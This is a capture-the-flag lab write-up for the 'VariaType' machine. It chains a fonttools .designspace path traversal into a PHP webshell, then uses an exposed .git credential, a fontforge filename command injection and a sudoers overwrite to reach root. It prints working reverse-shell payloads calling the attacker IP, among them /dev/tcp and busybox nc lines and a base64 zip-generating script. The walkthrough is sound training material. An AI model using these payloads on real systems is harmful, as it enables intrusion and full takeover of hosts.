# VariaType

**Target IP:** `10.129.244.202`  
**Hostname:** `variatype.htb`  
**Platform:** `Linux`  
**Difficulty:** `Medium`

---

## 1. Enumeration

### Port Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

Classic http + ssh combo, we should always start with looking at the http site, as this is often the first attack vector.

### Web Reconnaissance

The website is a variable font generator. It accepts a `.designspace` file alongside master fonts (`.ttf`/`.otf`) and produces a variable font. The site references open-standard tooling: **fonttools**, **fontmake**, and **gftools**.
![[Pasted image 20260317103701.png]]

Directory fuzzing:

```bash
feroxbuster --url http://variatype.htb
```

![[Pasted image 20260317104003.png]]

Nothing useful found beyond already-known URL paths.

Subdomain / vhost enumeration:

```bash
ffuf -c -u http://10.129.244.202 -H "Host: FUZZ.variatype.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301
```

![[Pasted image 20260317104021.png]]

This finds a new subdomain, portal, which I add to my /etc/hosts file so we can investigate further.

### Additional Enumeration

Looking at the portal subdomain, we get presented with a login:
![[Pasted image 20260317104132.png]]

This also seems to highlight that it is running VT VALID 2.1.4 and that offline mode is enabled.

Directory enumeration finds /files but this returns 403 when visiting. 
![[Pasted image 20260317105457.png]]

No obvious vulnerabilities are found for VT 2.1.4, it seems to be custom made.

---

## 2. CVE-2025-66034

At this stage, I think the vulnerability must be related to the uploading of files and the generation of a variable font. This could either be in the form of a specific exploit / CVE or a generic upload vulnerability.

Reading online, it appears that a .designspace file is simply an XML description for a variable font.

**Reference**: https://robofont.com/documentation/tutorials/creating-designspace-files/

To test this, I generated a .designspace file using claude, and a .tff font. I actually couldn't get this to work at all (perhaps it isn't designed to.)

While researching I found a potential CVE linking to file names in .designspace files when fonttools is used. This can lead to arbitrary file write and in some cases RCE. Both .designspace and fonttools (as seen earlier) are in use, so while we don't know the version is vulnerable, this is worth a try.

**Reference / POC**: https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv

### Exploitation

In the github advisory it gives a script, setup.py which can be used to first create the fonts needed. I run this on my attacker machine:

```bash
python3 setup.py
```

The first example of a .designspace file simply makes a file, while this is useful, we aren't going to be able to know if this is executed, so I instead skip ahead, and directly use malicious2.designspace, making modifications to the command to instead curl my attacker machine.

malicious2.designspace:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
	<axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
	    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
	        <labelname xml:lang="en"><![CDATA[<?php echo shell_exec("curl 10.10.14.2:8000");?>]]]]><![CDATA[>]]></labelname>
	        <labelname xml:lang="fr">MEOW2</labelname>
	    </axis>
	</axes>
	<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
	<sources>
		<source filename="source-light.ttf" name="Light">
			<location>
				<dimension name="Weight" xvalue="100"/>
			</location>
		</source>
		<source filename="source-regular.ttf" name="Regular">
			<location>
				<dimension name="Weight" xvalue="400"/>
			</location>
		</source>
	</sources>
	<variable-fonts>
		<variable-font name="MyFont" filename="output.ttf">
			<axis-subsets>
				<axis-subset name="Weight"/>
			</axis-subsets>
		</variable-font>
	</variable-fonts>
	<instances>
		<instance name="Display Thin" familyname="MyFont" stylename="Thin">
			<location><dimension name="Weight" xvalue="100"/></location>
			<labelname xml:lang="en">Display Thin</labelname>
		</instance>
	</instances>
</designspace>
```

I then spin up a small python listener:
```bash
python3 -m http.server
```

Then I upload my files to the website and click generate variable font.

This returns successful on the web page, however I don't receive a callback:
![[Pasted image 20260317111710.png]]

Let's modify our command to point to the absolute location of curl

```
/usr/bin/curl
```

This also fails, suggesting we can't directly execute commands and instead have to utilise the arbitrary file write. Unfortunately we have no clue where to write to, so back to the drawing board for the time being.

---
## 3. Portal subdomain

Given we found the portal subdomain but haven't done anything with it, I think we should dig a bit deeper here.

Running dirb on the subdomain, I see there is .git available on the portal subdomain:


I then use git-dumper (https://github.com/arthaud/git-dumper) to pull all the git files:
```bash
git-dumper http://portal.variatype.htb ./git
```

In here I find a single, mostly empty file, auth.php and some entries in the git log:
![[Pasted image 20260317113323.png]]

I checkout to a previous git commit using:
```bash
git checkout 753b5f5957f2020480a19bf29a0ebc80267a4a3d
```

And now reading the auth.php file I find what appears to be credentials:
![[Pasted image 20260317113600.png]]

gitbot : `G1tB0t_Acc3ss_2025!`

I am now able to log into the portal using these credentials:
![[Pasted image 20260317113646.png]]

---

## 4. LFI

On the new validation dashboard we have access to we can make note of a few interesting things. Firstly, this is using php, which is a good sign for our arbitrary file write. Secondly, we can view/download any of the fonts that have been made.

When clicking these links we get redirected to a URL such as ```
```
http://portal.variatype.htb/view.php?f=variabype_qqyI9zf7hws.ttf
```
which shows there is a file parameter which is being used, and is potentially vulnerable to lfi.

I enable burp suite and try playing around with this. At first I try the view/download endpoint and I have no luck. Seemingly simple attempts at path traversal are being stripped, with the file still found:
![[Pasted image 20260317114236.png]]

However, if they are using a regex filter to strip this it still might be exploitable. To test this we first want to use the same file name, but go up a level, when it errors that the file cannot be found, we know we have traversed a level.

With the payload `..././` we get an error that the file is not found. As suspected, this indicates that a regex filter is being used to find and strip `../` however, when done in this case, it strips `../`, leaving a new `../` behind:
![[Pasted image 20260317114722.png]]

We can exploit this to read /etc/passwd:
![[Pasted image 20260317114748.png]]

This tell us that our likely user target is steve.
### LFI enumeration

Now that we have achieved LFI, we need to search around a bit to try and find where we can attempt to write a php shell to, using our CVE. We know from earlier enumeration there is a /files directory on the portal subdomain, so this is a likely target, we just need to know where on the host this folder is. 

From looking at a 404 page or any other coerced error we can see the site is running nginx:
![[Pasted image 20260317115017.png]]

Because of this we can start by looking in some typical nginx configuration files such as:
```
/etc/nginx/sites-available/
/etc/nginx/sites-enabled/
/etc/nginx/conf.d/
/etc/nginx/nginx.conf
```

Starting in /etc/nginx/nginx.conf we find our next lead:
![[Pasted image 20260317115411.png]]

Then looking at /etc/nginx/sites-enabled/portal.variatype.htb:
![[Pasted image 20260317115516.png]]

We find that the root directory is /var/www/portal.variatype.htb/public

and so the files directory is likely /var/www/portal.variatype.htb/public/files

### Attempted file write to files

I now went back to the github advisory and realised I missed something very essential. We need to execute the php somehow, to do this I need to write it to a specific file, which can be done by changing the filename parameter of MaliciousFont to `../../../../../../../var/www/portal.variatype.htb/public/files/shell.php`
```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
	<axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
	    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
	        <labelname xml:lang="en"><![CDATA[<?php echo shell_exec("curl 10.10.14.2:8000");?>]]]]><![CDATA[>]]></labelname>
	        <labelname xml:lang="fr">MEOW2</labelname>
	    </axis>
	</axes>
	<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
	<sources>
		<source filename="source-light.ttf" name="Light">
			<location>
				<dimension name="Weight" xvalue="100"/>
			</location>
		</source>
		<source filename="source-regular.ttf" name="Regular">
			<location>
				<dimension name="Weight" xvalue="400"/>
			</location>
		</source>
	</sources>
	<variable-fonts>
		<variable-font name="MyFont" filename="../../../../../../../var/www/portal.variatype.htb/public/files/shell.php">
			<axis-subsets>
				<axis-subset name="Weight"/>
			</axis-subsets>
		</variable-font>
	</variable-fonts>
	<instances>
		<instance name="Display Thin" familyname="MyFont" stylename="Thin">
			<location><dimension name="Weight" xvalue="100"/></location>
			<labelname xml:lang="en">Display Thin</labelname>
		</instance>
	</instances>
</designspace>
```

Then I upload these files and attempt to generate a font again.

Now if we navigate to `http://portal.variatype.htb/files/shell.php` we get some weird garbled response but on our listener, we see we get a hit, indicating it has executed:
![[Pasted image 20260317133449.png]]

---

## 4. Shell as www-data

Tying everything we have learnt together, we can now attempt to make a shell. I start a listener using penelope, then modify our .designspace file like so:
```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
	<axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
	    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
	        <labelname xml:lang="en"><![CDATA[<?php echo shell_exec("/bin/bash -i >& /dev/tcp/10.10.14.2/4444 0>&1");?>]]]]><![CDATA[>]]></labelname>
	        <labelname xml:lang="fr">MEOW2</labelname>
	    </axis>
	</axes>
	<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
	<sources>
		<source filename="source-light.ttf" name="Light">
			<location>
				<dimension name="Weight" xvalue="100"/>
			</location>
		</source>
		<source filename="source-regular.ttf" name="Regular">
			<location>
				<dimension name="Weight" xvalue="400"/>
			</location>
		</source>
	</sources>
	<variable-fonts>
		<variable-font name="MyFont" filename="../../../../../../../var/www/portal.variatype.htb/public/files/shell.php">
			<axis-subsets>
				<axis-subset name="Weight"/>
			</axis-subsets>
		</variable-font>
	</variable-fonts>
	<instances>
		<instance name="Display Thin" familyname="MyFont" stylename="Thin">
			<location><dimension name="Weight" xvalue="100"/></location>
			<labelname xml:lang="en">Display Thin</labelname>
		</instance>
	</instances>
</designspace>
```

This changes the output (demonstrating it has written successfully) but I do not get a shell, suggesting the payload has failed.

I play around with several different payloads but this is the one that finally worked (shoutout to revshells.com):
```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
	<axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
	    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
	        <labelname xml:lang="en"><![CDATA[<?php echo shell_exec("busybox nc 10.10.14.2 4444 -e /bin/bash");?>]]]]><![CDATA[>]]></labelname>
	        <labelname xml:lang="fr">MEOW2</labelname>
	    </axis>
	</axes>
	<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
	<sources>
		<source filename="source-light.ttf" name="Light">
			<location>
				<dimension name="Weight" xvalue="100"/>
			</location>
		</source>
		<source filename="source-regular.ttf" name="Regular">
			<location>
				<dimension name="Weight" xvalue="400"/>
			</location>
		</source>
	</sources>
	<variable-fonts>
		<variable-font name="MyFont" filename="../../../../../../../var/www/portal.variatype.htb/public/files/shell.php">
			<axis-subsets>
				<axis-subset name="Weight"/>
			</axis-subsets>
		</variable-font>
	</variable-fonts>
	<instances>
		<instance name="Display Thin" familyname="MyFont" stylename="Thin">
			<location><dimension name="Weight" xvalue="100"/></location>
			<labelname xml:lang="en">Display Thin</labelname>
		</instance>
	</instances>
</designspace>
```

And we get a shell as www-data:
![[Pasted image 20260317133944.png]]

We see a home directory for steve but we are unable to access this.

---

## 5. Privilege Escalation — www-data to steve

### Enumeration

The first thing I do is manually hunt around a little bit. I discover in /opt there is some interesting folders and files, including a .bak file owned by steve:
![[Pasted image 20260317134441.png]]

This bak file appears to be a bash script which attempts to use fontforge to process fonts in some way and then move them to another location:
![[Pasted image 20260317140756.png]]

I find the version of fontforge being used like so:
![[Pasted image 20260317142241.png]]

Giving the version is 20230101
### CVE-2024-25081 & CVE-2024-25082

Doing a search for the fontforge version we can see it is very old and vulnerable to two CVEs. These CVEs are command injection vulnerabilities that allow RCE when processing specially crafted font files.

Now to exploit this, I used claude to generate me a python script which will make a zip with a nested malicious filename inside, which when extracted, will execute my code:

```python
import zipfile
import base64

YOUR_IP = "10.10.14.2"
YOUR_PORT = "4444"

# Base64 encode the reverse shell payload
raw_payload = f"bash -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1"
b64_payload = base64.b64encode(raw_payload.encode()).decode()

# Escape {{ }} so Python doesn't interpret ${IFS} as a variable
malicious_filename = f"exploit/$(echo {b64_payload}|base64 -d|bash).ttf"

payload = b"FONT_DATA"

with zipfile.ZipFile("payload.zip", "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr(malicious_filename, payload)

print("[+] Created payload.zip")
print(f"[+] Raw payload   : {raw_payload}")
print(f"[+] B64 payload   : {b64_payload}")
print(f"[+] Inner filename: {malicious_filename}")
```

Then we simply run this within ~/portal.variatype.htb/public/files and shortly after we get a shell as steve:
![[Pasted image 20260317144809.png]]

And we can grab user flag.
![[Pasted image 20260317144906.png]]

## 6. Privilege escalation - steve to root

To start the privilege escalation i first check for lowhanging fruit such as 
```bash
sudo -l
```

and we find something:
![[Pasted image 20260317154502.png]]

This file seems to be a tool to install validation plugins (which appear to also be py files) from an external host:
![[Pasted image 20260317154625.png]]

What this tool seems to do is simply perform some checks on the url and if it passes, it goes to the url, fetches the file and writes it to the /validators directory. No execution occurs as root so we can't use this directly, but my thought is we can perhaps use some form of traversal to overwrite files, as it is running as root.

I start by running a few tests, by first giving it a valid py file, which it happily moves to /validators. I then try and give it a longer file path including a folder, and it simply goes into that folder, grabs the file and moves it into /validators:
![[Pasted image 20260318095204.png]]

Ideally, I want to see if it's possible to move around folders a bit within /validators first. I discover that if I url encode the slashes, it attempts to write into a non existent folder within /validators, e.g. in this case, I have placed a python file within a folder called evil-0.1 on my attacker host, and when downloading the plugin it is attempting to also write into this folder, but fails as it doesn't exist:
![[Pasted image 20260318095351.png]]

So we can move into folders, but can we traverse out of folders. I then discovered something very interesting. If we start the path with %2f, it appears to try to write the file directly to the host, without being within the /validators folder at all or requiring any path traversal. Using this we can overwrite any file in the file system:
![[Pasted image 20260318100008.png]]

To exploit this, on my attacker machine, I make a folder etc and inside add a file called sudoers with steve as an entry.
```bash
mkdir etc
echo 'steve ALL=(ALL) NOPASSWD:ALL' >> ./etc/sudoers
```

Then I host this
```bash
python3 -m http.server 80
```

Then we can download and force the system to copy it as root, overwritting the sudoers file:
```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.2/%2fetc%2fsudoers#egg=evil-0.1
```

Then we can escalate to root by simply doing su:
```bash
sudo su
```

And we can read root.txt:
![[Pasted image 20260318113505.png]]

---

## Summary

| Step                 | Technique                                                                                                                          |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| Initial access       | CVE-2025-66034 — fonttools `.designspace` path traversal used to write a PHP webshell to the nginx web root                        |
| Credential access    | Exposed `.git` directory on portal subdomain; plaintext credentials recovered from a previous commit in `auth.php`                 |
| User shell           | CVE-2024-25081/CVE-2024-25082 — fontforge command injection via malicious zip filename; reverse shell as steve                     |
| Privilege escalation | Arbitrary file write as root via URL path traversal in `install_validator.py`; `/etc/sudoers` overwritten to grant steve full sudo |